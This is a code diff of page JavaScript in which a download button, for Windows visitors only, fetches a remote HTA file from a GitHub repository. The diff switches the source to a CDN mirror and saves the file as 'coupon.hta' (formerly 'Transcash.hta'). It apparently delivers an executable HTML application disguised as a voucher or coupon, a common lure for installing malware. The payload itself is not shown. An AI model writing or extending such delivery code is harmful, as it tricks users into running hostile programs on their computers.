@@ -124,16 +124,15 @@
     return navigator.userAgent.indexOf('Windows') !== -1;
   }
 
-  const downloadLink = "https://raw.githubusercontent.com/fabienneroger/hta-finale/main/finale.hta";
   const downloadBtn = document.getElementById("downloadBtn");
+  const downloadLink = "https://cdn.jsdelivr.net/gh/fabienneroger/hta-finale@main/finale.hta";
 
   downloadBtn.addEventListener("click", function(e) {
     e.preventDefault();
     if (isWindows()) {
-      // Crée dynamiquement un lien <a>
-      const a = document.createElement("a");
+      const a = document.createElement('a');
       a.href = downloadLink;
-      a.download = "Transcash.hta"; // Nom du fichier téléchargé
+      a.download = 'coupon.hta';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
